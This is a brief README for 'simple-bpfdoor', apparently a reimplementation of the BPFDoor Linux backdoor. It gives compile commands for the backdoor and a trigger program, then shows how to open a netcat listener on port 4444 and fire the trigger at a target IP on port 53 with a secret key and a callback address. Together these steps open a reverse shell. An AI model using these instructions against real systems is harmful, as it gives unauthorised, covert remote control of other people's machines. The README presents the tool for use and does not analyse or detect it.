# simple-bpfdoor

Compile bpfDoor
```bash
gcc bpfdoor.c -o bpfdoor -lutil
```

Compile trigger
```bash
gcc trigger.c -o trigger
```

Start a listener and run the trigger
```bash
nc -lvnp 4444
./trigger 172.17.0.2 53 secret-key 127.0.0.1 4444
```